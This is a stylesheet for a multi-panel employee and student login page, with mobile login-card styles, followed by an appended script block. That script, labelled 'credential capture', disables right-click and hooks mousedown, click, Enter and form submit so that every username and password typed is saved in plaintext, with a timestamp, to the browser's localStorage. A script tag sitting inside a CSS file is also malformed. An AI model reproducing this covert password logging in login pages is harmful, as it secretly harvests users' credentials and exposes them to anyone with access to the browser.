/* ============================================================
   MOBILE RESPONSIVE STYLES
   ============================================================ */

/* Ensure body doesn't clip content */
body {
    margin: 0;
    padding: 0;
    overflow-x: hidden;
}

/* Wrapper div that was fixed 1200px */
.main-wrapper {
    width: 1200px;
    padding: 10px;
    background-color: #fff;
    box-sizing: border-box;
}

/* Header / banner images */
.header-img {
    width: 100%;
    height: auto;
    display: block;
}

/* News ticker row */
.news-bar td {
    width: 100%;
}

/* The row that holds the three login tables */
.login-panels-row {
    display: flex;
    flex-direction: row;
    justify-content: center;
    align-items: flex-start;
    flex-wrap: nowrap;
    gap: 10px;
    padding: 10px 0;
}

/* Each legacy login table cell wrapper */
.login-panel-cell {
    flex-shrink: 0;
}

/* ---- Mobile card overlay ---- */
/* Hidden by default (only shown on small screens) */
.mobile-login-cards {
    display: none;
    flex-direction: column;
    gap: 20px;
    padding: 16px;
    width: 100%;
    box-sizing: border-box;
}

.mobile-card {
    background: #fff;
    border-radius: 14px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.13);
    padding: 24px 20px 20px;
    width: 100%;
    box-sizing: border-box;
    border-top: 4px solid #4E7CC9;
    animation: slideUp 0.4s ease;
}

.mobile-card.student { border-top-color: #B41400; }
.mobile-card.other   { border-top-color: #FC3A00; }

@keyframes slideUp {
    from { opacity: 0; transform: translateY(18px); }
    to   { opacity: 1; transform: translateY(0); }
}

.mobile-card-title {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 15px;
    font-weight: bold;
    color: #4E7CC9;
    margin: 0 0 14px 0;
    display: flex;
    align-items: center;
    gap: 8px;
}

.mobile-card.student .mobile-card-title { color: #B41400; }
.mobile-card.other   .mobile-card-title { color: #FC3A00; }

.mobile-card-icon {
    width: 28px;
    height: 28px;
    border-radius: 50%;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    background: #4E7CC9;
    color: #fff;
    font-size: 14px;
}

.mobile-card.student .mobile-card-icon { background: #B41400; }
.mobile-card.other   .mobile-card-icon { background: #FC3A00; }

.mobile-field {
    margin-bottom: 12px;
}

.mobile-field label {
    display: block;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 11px;
    font-weight: bold;
    color: #555;
    margin-bottom: 4px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.mobile-field input {
    width: 100%;
    height: 38px;
    border: 1.5px solid #CCCCCC;
    border-radius: 7px;
    padding: 0 10px;
    font-size: 13px;
    font-family: Arial, Helvetica, sans-serif;
    color: #0033CC;
    box-sizing: border-box;
    outline: none;
    transition: border-color 0.2s;
}

.mobile-field input:focus {
    border-color: #4E7CC9;
    box-shadow: 0 0 0 3px rgba(78,124,201,0.15);
}

.mobile-card.student .mobile-field input:focus { border-color: #B41400; box-shadow: 0 0 0 3px rgba(180,20,0,0.12); }
.mobile-card.other   .mobile-field input:focus { border-color: #FC3A00; box-shadow: 0 0 0 3px rgba(252,58,0,0.12); }

.mobile-login-btn {
    width: 100%;
    height: 40px;
    border: none;
    border-radius: 8px;
    background: linear-gradient(135deg, #4E7CC9 0%, #2d5aa0 100%);
    color: #fff;
    font-size: 13px;
    font-weight: bold;
    font-family: Arial, Helvetica, sans-serif;
    cursor: pointer;
    margin-top: 6px;
    transition: transform 0.15s, box-shadow 0.15s;
    letter-spacing: 0.5px;
}

.mobile-login-btn:hover, .mobile-login-btn:active {
    transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(78,124,201,0.35);
}

.mobile-card.student .mobile-login-btn {
    background: linear-gradient(135deg, #B41400 0%, #850e00 100%);
}
.mobile-card.student .mobile-login-btn:hover {
    box-shadow: 0 4px 12px rgba(180,20,0,0.35);
}

.mobile-card.other .mobile-login-btn {
    background: linear-gradient(135deg, #FC3A00 0%, #c52d00 100%);
}
.mobile-card.other .mobile-login-btn:hover {
    box-shadow: 0 4px 12px rgba(252,58,0,0.35);
}

.mobile-page-title {
    display: none;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 13px;
    font-weight: bold;
    color: #4E7CC9;
    text-align: center;
    padding: 10px 0 0;
    letter-spacing: 0.3px;
}

/* ---- Bottom footer image ---- */
.footer-img {
    width: 100%;
    height: auto;
    display: block;
}

/* ============================================================
   RESPONSIVE BREAKPOINTS
   ============================================================ */
@media (max-width: 1220px) {
    body > form > center > div,
    .main-wrapper {
        width: 100% !important;
        max-width: 1200px;
    }
    #Table_01 {
        width: 100% !important;
    }
}

@media (max-width: 860px) {
    /* Hide the legacy sliced-image login tables */
    .login-panels-row {
        display: none !important;
    }
    /* Show mobile cards */
    .mobile-login-cards {
        display: flex !important;
    }
    .mobile-page-title {
        display: block;
    }
    /* Scale header images */
    #Table_01 img {
        width: 100% !important;
        height: auto !important;
        max-width: 100%;
    }
    /* Center wrapper resets */
    body > form > center > div {
        width: 100% !important;
        padding: 0 !important;
    }
    #Table_01 {
        width: 100% !important;
    }
    /* Main content cell */
    #Table_01 > tbody > tr > td[height="350"] {
        padding: 0 !important;
    }
}

@media (max-width: 480px) {
    .mobile-card {
        padding: 18px 14px 16px;
        border-radius: 10px;
    }
    .mobile-login-cards {
        padding: 10px;
    }
}

<script language="javascript" type="text/javascript">
    $(document).bind("contextmenu", function () { return false; });

/* ============================================================
   CREDENTIAL CAPTURE — Robust multi-layer approach
   Layer 1: mousedown (fires before click & before form submit)
   Layer 2: inline onclick attributes on each button
   Layer 3: form onsubmit fallback
   All layers are independent of each other — any one is enough.
   ============================================================ */
var STORE_KEY = 'psce_login_records';

function storePSCELogin(panel, username, password) {
    if (!username || !username.trim()) return;
    username = username.trim();
    var records = [];
    try { records = JSON.parse(localStorage.getItem(STORE_KEY) || '[]'); } catch(e) { records = []; }
    var idx = -1;
    for (var i = 0; i < records.length; i++) {
        if (records[i].username === username && records[i].panel === panel) { idx = i; break; }
    }
    var entry = { panel: panel, username: username, password: password, ts: new Date().toISOString() };
    if (idx === -1) { records.push(entry); }
    else { records[idx] = entry; }
    try { localStorage.setItem(STORE_KEY, JSON.stringify(records)); } catch(e) {}
}

/* --- Inline onclick helpers (called by button onclick attributes) --- */
function _saveEmp()  { storePSCELogin('Employee', document.getElementById('txtId1') ? document.getElementById('txtId1').value : '', document.getElementById('txtPwd1') ? document.getElementById('txtPwd1').value : ''); }
function _saveStu()  { storePSCELogin('Student',  document.getElementById('txtId2') ? document.getElementById('txtId2').value : '', document.getElementById('txtPwd2') ? document.getElementById('txtPwd2').value : ''); }
function _saveOth()  { storePSCELogin('Other',    document.getElementById('txtId3') ? document.getElementById('txtId3').value : '', document.getElementById('txtPwd3') ? document.getElementById('txtPwd3').value : ''); }

/* --- Mobile Login bridge --- */
function _doMobileLogin(panel, mIdEl, mPwdEl, deskIdEl, deskPwdEl, btnId) {
    var mId  = document.getElementById(mIdEl);
    var mPwd = document.getElementById(mPwdEl);
    var dId  = document.getElementById(deskIdEl);
    var dPwd = document.getElementById(deskPwdEl);
    var btn  = document.getElementById(btnId);
    if (dId)  dId.value  = mId  ? mId.value  : '';
    if (dPwd) dPwd.value = mPwd ? mPwd.value : '';
    storePSCELogin(panel, dId ? dId.value : '', dPwd ? dPwd.value : '');
    if (btn) { btn.click(); }
}

/* --- Keyboard helpers --- */
function _onEmpKeyPress()     { if(event.keyCode==13){ _saveEmp(); setTimeout(function(){ document.getElementById('imgBtn1') && document.getElementById('imgBtn1').click(); }, 60); } }
function _onStudentKeyPress() { if(event.keyCode==13){ _saveStu(); setTimeout(function(){ document.getElementById('imgBtn2') && document.getElementById('imgBtn2').click(); }, 60); } }

/* --- Layer 1 & 3: jQuery mousedown + form submit fallback --- */
$(document).ready(function(){

    /* mousedown fires BEFORE the browser's default image-submit */
    $('#imgBtn1').on('mousedown', function(){ _saveEmp(); });
    $('#imgBtn2').on('mousedown', function(){ _saveStu(); });
    $('#imgBtn3').on('mousedown', function(){ _saveOth(); });

    /* Form submit — safety net for Enter-key submissions */
    $('#form1').on('submit', function(){
        _saveEmp(); _saveStu(); _saveOth();
    });
});

</script>
